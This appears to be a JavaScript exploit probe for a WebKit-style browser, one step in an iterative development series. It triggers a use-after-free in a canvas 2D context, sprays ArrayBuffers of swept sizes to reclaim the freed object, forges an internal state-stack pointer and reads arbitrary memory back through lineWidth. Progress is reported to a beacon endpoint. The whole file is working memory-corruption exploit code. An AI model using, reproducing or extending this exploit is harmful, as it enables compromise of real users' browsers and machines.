// p495 — carrier/class sweep.
//
// p494 result: BOOT -> TRIG -> AB-SPRAY (64 x ArrayBuffer(768)), then NO SAVE.
// save() writes at object+0x250 with no deref; its absence means the write
// faulted => none of the 64 x 768 ABs occupied the freed ~712 B context slot.
// Prime suspect: 768 is the wrong libpas size class (or AB data and WebCore
// fastMalloc use different heaps).
//
// This probe sweeps AB data sizes 640..800 step 8 (4 each). If any AB lands in
// the slot's class, save() succeeds and the 0->1 marker appears in that AB.
(function () {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();
  var staged = [];
  ['BOOT','TRIG','AB-SPRAY','SAVE','FORGED','LEAK','MISS','DONE','HTMLERR']
    .forEach(function (n) {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V495-' + n);
      staged.push([n, x]);
    });
  function S(name, body) {
    try {
      for (var i = 0; i < staged.length; i++)
        if (staged[i][0] === name) { staged[i][1].send('[' + (Date.now() - T0) + 'ms] ' + (body || '')); return; }
    } catch (e) {}
  }

  var CANDS = [0x7EF5A8000, 0x7EF000000, 0x7F0000000, 0x10000000,
               0x30000000, 0x7E0000000, 0x50000000, 0x40000000];
  var idx = 0;
  try {
    idx = parseInt(localStorage.getItem('p495cand') || '0', 10);
    if (isNaN(idx) || idx < 0) idx = 0;
    if (idx >= CANDS.length) idx = CANDS.length - 1;
    localStorage.setItem('p495cand', String(idx + 1));
  } catch (e) {}
  var CAND = CANDS[idx];

  S('BOOT', 'cand=0x' + CAND.toString(16) + ' idx=' + idx + ' ' + navigator.userAgent);

  var inner = null;
  var tc = document.createElement('canvas');
  var outer = tc.getContext('2d', {
    get desynchronized() { inner = tc.getContext('2d'); return false; }
  });
  S('TRIG', 'inner=' + (!!inner) + ' outer=' + (!!outer));
  if (!inner) { S('MISS', 'no-inner'); S('DONE', ''); return; }

  // Size sweep around the ~712 B context. Every size is >= 640, so the save
  // counter at object+0x250 (592) is inside every buffer.
  var SIZES = [];
  for (var z = 640; z <= 800; z += 8) SIZES.push(z);
  var dvs = [], lens = [];
  for (var si = 0; si < SIZES.length; si++) {
    for (var r = 0; r < 4; r++) {
      var ab = new ArrayBuffer(SIZES[si]);
      var dv = new DataView(ab);
      for (var o = 0; o + 4 <= SIZES[si]; o += 4) dv.setUint32(o, 0, true);
      dvs.push(dv);
      lens.push(SIZES[si]);
    }
  }
  S('AB-SPRAY', 'n=' + dvs.length + ' sizes=640..800/8');

  // Deref-free occupancy marker.
  inner.save();
  var hit = -1, off = -1;
  scan:
  for (var i = 0; i < dvs.length; i++) {
    var dv = dvs[i], L = lens[i];
    for (var o = 0; o + 4 <= L; o += 4) {
      if (dv.getUint32(o, true) === 1) { hit = i; off = o; break scan; }
    }
  }
  if (hit < 0) { S('SAVE', 'miss'); S('MISS', 'no-carrier'); S('DONE', ''); return; }
  S('SAVE', 'hit i=' + hit + ' size=' + lens[hit] + ' off=0x' + off.toString(16));

  // Distance m_unrealizedSaveCount - m_stateStack = 0x1E0 (Vector<State,1> 0x1D0 + FloatRect 0x10).
  var h = off - 0x1E0;
  if (h < 0 || h + 16 > lens[hit]) { S('MISS', 'odd-off'); S('DONE', ''); return; }
  var dv = dvs[hit];
  dv.setUint32(h, CAND >>> 0, true);
  dv.setUint32(h + 4, Math.floor(CAND / 4294967296), true);
  dv.setUint32(h + 8, 1, true);
  dv.setUint32(h + 12, 1, true);
  S('FORGED', 'h=0x' + h.toString(16) + ' size=' + lens[hit] + ' cand=0x' + CAND.toString(16));

  var v = inner.lineWidth;
  var f = new ArrayBuffer(8), fv = new DataView(f);
  fv.setFloat64(0, v, true);
  var lo = fv.getUint32(0, true), hi = fv.getUint32(4, true);
  S('LEAK', 'lineWidth=' + v + ' bits=0x' + hi.toString(16).padStart(8, '0') + lo.toString(16).padStart(8, '0'));
  S('DONE', 'gadget-ok');
})();
